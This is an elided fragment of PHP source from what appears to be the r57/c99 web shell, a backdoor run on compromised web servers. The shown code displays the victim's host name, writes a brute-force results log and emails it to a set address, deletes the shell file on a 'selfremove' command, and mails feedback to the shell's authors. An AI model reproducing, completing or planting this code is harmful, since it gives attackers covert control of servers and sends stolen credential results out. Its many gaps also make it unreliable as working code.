...
$ud = urlencode($d);
?>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1251"><meta http-equiv="Content-Language" content="en-us"><title><?php echo getenv("HTTP_HOST"); ?> - r57c99.com.org</title><STYLE>
 ...
 else
 {
  ...
  if (!empty($submit))
  {
   ...
   else
   {
    ...
    if ($fqb_logfp) {fseek($fqb_logfp,0); fwrite($fqb_logfp,$fqb_log,strlen($fqb_log));}
    if ($fqb_logemail) {@mail($fqb_logemail,"r57c99.com.Org ".$shver." report",$fqb_log);}
    fclose($fqb_logfp);
   }
  }
  else
...
if ($act == "selfremove")
{
 ...
 {
  if (unlink(__FILE__)) {@ob_clean(); echo "Thanks for using r57c99.com.Org".$shver."!"; k1r4exit(); }
...
if ($act == "feedback")
{
 ...
 if (!empty($submit))
 {
  ...
  mail($suppmail,"r57c99.com.org".$shver." feedback #".$ticket,$body,"FROM: ".$suppmail);
